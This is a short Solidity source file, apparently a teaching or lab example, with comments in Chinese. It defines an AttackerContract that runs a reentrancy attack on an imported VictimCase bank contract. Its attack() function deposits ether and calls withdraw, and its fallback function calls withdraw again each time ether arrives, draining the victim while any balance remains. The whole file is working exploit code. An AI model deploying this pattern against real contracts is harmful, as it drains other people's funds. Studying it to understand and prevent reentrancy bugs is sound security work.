// SPDX-License-Identifier: MIT  
pragma solidity 0.8.27;

import "./victimCase.sol";
  
contract AttackerContract {
    VictimCase public bank;

    // 构造函数，初始化Bank合约的地址，必须填写创建 VictimCase 合约的地址
    constructor(address _bankAddress) {
        bank = VictimCase(_bankAddress);
    }  
  
    // fallback函数，在接收以太币时自动调用  
    fallback() external payable {
        if (address(bank).balance > 0) {  
            // 递归调用Bank合约的withdraw函数  
            bank.withdraw();
        }
    }
  
    // 启动攻击
    function attack() external payable {
        // 假设已经通过deposit或其他方式在Bank合约中有余额  
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}